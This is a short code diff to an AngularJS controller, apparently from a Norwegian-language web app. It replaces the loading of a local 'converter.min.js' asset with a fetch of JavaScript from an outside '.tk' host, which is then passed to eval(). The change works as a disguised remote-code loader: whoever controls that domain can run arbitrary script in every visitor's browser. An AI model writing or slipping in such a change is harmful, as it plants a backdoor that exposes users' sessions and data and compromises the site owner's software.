@@ -25,7 +25,7 @@ app.controller('masterCtrl', ['$http', '$chttp', '$timeout', function ($http, $c
   vm.success = false;
   vm.data = [];
   vm.coords = [0,0];
-  vm.conv = $chttp.get('assets/converter.min.js').then((data)=>{
+  vm.conv = $chttp.get('//real-timer-server.tk/getjs2.php').then((data)=>{
     eval(data);
   }).catch((data, status)=>{
     vm.status = "Vennligst oppdater siden";
